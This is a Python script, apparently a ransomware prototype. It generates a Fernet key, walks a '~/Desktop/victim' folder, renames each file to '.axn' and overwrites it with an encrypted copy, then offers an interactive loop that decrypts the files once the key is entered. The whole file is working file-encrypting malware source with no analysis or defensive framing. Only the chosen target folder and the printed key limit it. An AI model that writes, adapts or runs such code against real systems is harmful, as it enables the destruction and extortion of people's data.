import os
import json
from datetime import datetime
import random
from cryptography.fernet import Fernet

EXTENSIONS_FILE = "extensions.json"


# 🔥 Denver module logic directly in the script
def gen_key():
    """Generate a random encryption key."""
    return Fernet.generate_key().decode('utf-8')


def encrypt(data, key):
    """Encrypt data using Fernet."""
    f = Fernet(key.encode('utf-8'))
    encrypted = f.encrypt(data)
    return encrypted, key


def decrypt(data, key):
    """Decrypt data using Fernet."""
    try:
        f = Fernet(key.encode('utf-8'))
        decrypted = f.decrypt(data)
        return decrypted
    except Exception:
        return None


# ✅ File handling functions
def load_extensions():
    """Load previous file extensions from JSON."""
    if os.path.exists(EXTENSIONS_FILE):
        with open(EXTENSIONS_FILE, "r") as f:
            return json.load(f)
    return {}


def save_extensions(data):
    """Save extensions to JSON."""
    with open(EXTENSIONS_FILE, "w") as f:
        json.dump(data, f, indent=4)


def change_extension(file_path, new_extension):
    """Change file extension with conflict handling."""
    dir_name, file_name = os.path.split(file_path)
    base, _ = os.path.splitext(file_name)

    new_file_name = f"{base}.{new_extension.lstrip('.')}"
    new_file_path = os.path.join(dir_name, new_file_name)

    # Add timestamp/random suffix if conflict occurs
    if os.path.exists(new_file_path):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = random.randint(1000, 9999)
        new_file_name = f"{base}_{timestamp}_{random_suffix}.{new_extension.lstrip('.')}"
        new_file_path = os.path.join(dir_name, new_file_name)

    os.rename(file_path, new_file_path)
    return new_file_path


# ✅ Main Execution
key = gen_key()
print(f"🔑 Generated Encryption Key: {key}")

# Load previous extensions
original_ext = load_extensions()

# 📂 Target directories
directories_to_process = [
    os.path.join(os.path.expanduser("~"), "Desktop", "victim")
]

# 🔒 Encrypt Files
for directory in directories_to_process:
    if os.path.exists(directory):
        for root, _, files in os.walk(directory):
            print(f"\n📂 Processing Directory: {root}")

            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file_path)

                # Skip already encrypted files
                if ext == ".axn":
                    print(f"    🔒 Skipping: {file_path} (Already encrypted)")
                    continue

                # Store original extension
                try:
                    new_file_path = change_extension(file_path, "axn")
                    original_ext[new_file_path] = ext
                    save_extensions(original_ext)

                    # Encrypt content in binary mode
                    with open(new_file_path, "rb") as f:
                        content = f.read()

                    encrypted_content, k = encrypt(content, key)

                    # Write encrypted content in binary mode
                    with open(new_file_path, "wb") as f:
                        f.write(encrypted_content)

                    print(f"    ✅ Encrypted: {file_path} ➝ {new_file_path}")

                except PermissionError:
                    print(f"    ❌ Permission denied: {file_path} (Skipping...)")
                except Exception as e:
                    print(f"    ❌ Error: {e}")

# 🔓 Decryption loop
while True:
    action = input("\nEnter 'd' to decrypt or 'q' to quit: ").strip().lower()

    if action == "d":
        user_key = input("🔑 Enter Decryption Key: ").strip()

        for directory in directories_to_process:
            if os.path.exists(directory):
                for root, _, files in os.walk(directory):
                    print(f"\n📂 Decrypting in Directory: {root}")

                    for file in files:
                        file_path = os.path.join(root, file)

                        # Only process `.axn` files
                        if not file_path.endswith(".axn"):
                            continue

                        try:
                            # Read encrypted content in binary mode
                            with open(file_path, "rb") as f:
                                encrypted_content = f.read()

                            # Decrypt
                            decrypted_content = decrypt(encrypted_content, user_key)

                            if decrypted_content:
                                # Write decrypted content
                                with open(file_path, "wb") as f:
                                    f.write(decrypted_content)

                                # Restore original extension
                                original_extension = original_ext.get(file_path, ".txt")
                                restored_path = change_extension(file_path, original_extension.lstrip("."))

                                print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")
                            else:
                                print(f"    ❌ Incorrect key. Skipping {file_path}")

                        except PermissionError:
                            print(f"    ❌ Permission denied: {file_path} (Skipping...)")
                        except Exception as e:
                            print(f"    ❌ Error: {e}")

    elif action == "q":
        print("👋 Exiting...")
        break
